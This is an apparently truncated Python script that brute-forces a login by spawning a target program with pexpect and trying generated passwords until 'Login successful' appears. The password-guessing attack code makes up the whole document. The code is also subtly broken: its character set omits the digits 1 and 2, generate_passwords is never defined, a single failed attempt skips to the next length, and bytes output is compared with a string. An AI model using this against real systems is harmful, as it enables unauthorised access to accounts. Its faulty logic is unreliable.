import pexpect
import sys

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <target> <min_length>")
        return
    
    target = sys.argv[1]
    min_length = int(sys.argv[2])
    
    # Define the characters to use through (lowercase, uppercase, digits)
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ03456789"
    
    # Brute-force loop
    for length in range(min_length, 10):  # 10 is an arbitrary upper limit
        for password in generate_passwords(length, chars):
            try:
                child = pexpect.spawn(target)
                child.expect('Password:')
                child.sendline(password)
                result = child.read()
                
                if 'Login successful' in result:
                    print(f"Found password: {password}")
                    return
                elif 'Login failed' in result:
                    break  # Move to next password length
